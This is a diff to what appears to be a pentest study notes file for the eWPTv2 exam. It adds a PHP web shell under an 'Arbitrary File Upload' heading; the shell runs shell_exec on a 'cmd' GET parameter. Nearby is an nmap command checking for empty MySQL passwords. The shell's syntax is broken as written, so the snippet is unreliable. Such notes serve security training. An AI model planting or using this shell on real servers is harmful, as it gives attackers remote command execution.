@@ -63,6 +63,14 @@
 ## Nmap Scan for the eWPTv2
 - __```sudo nmap -sS -sV --script mysql-empty-password -p 3306 120.0.0.1```__
 
+## Arbitrary File Upload 
+```php
+<?php
+$output = shell_exec($_GET(["cmd"]);
+echo "<pre>$output</pre>";
+?>
+```
+
 
 # Check list
 - [x] [Open redirect](open_redirect.md)
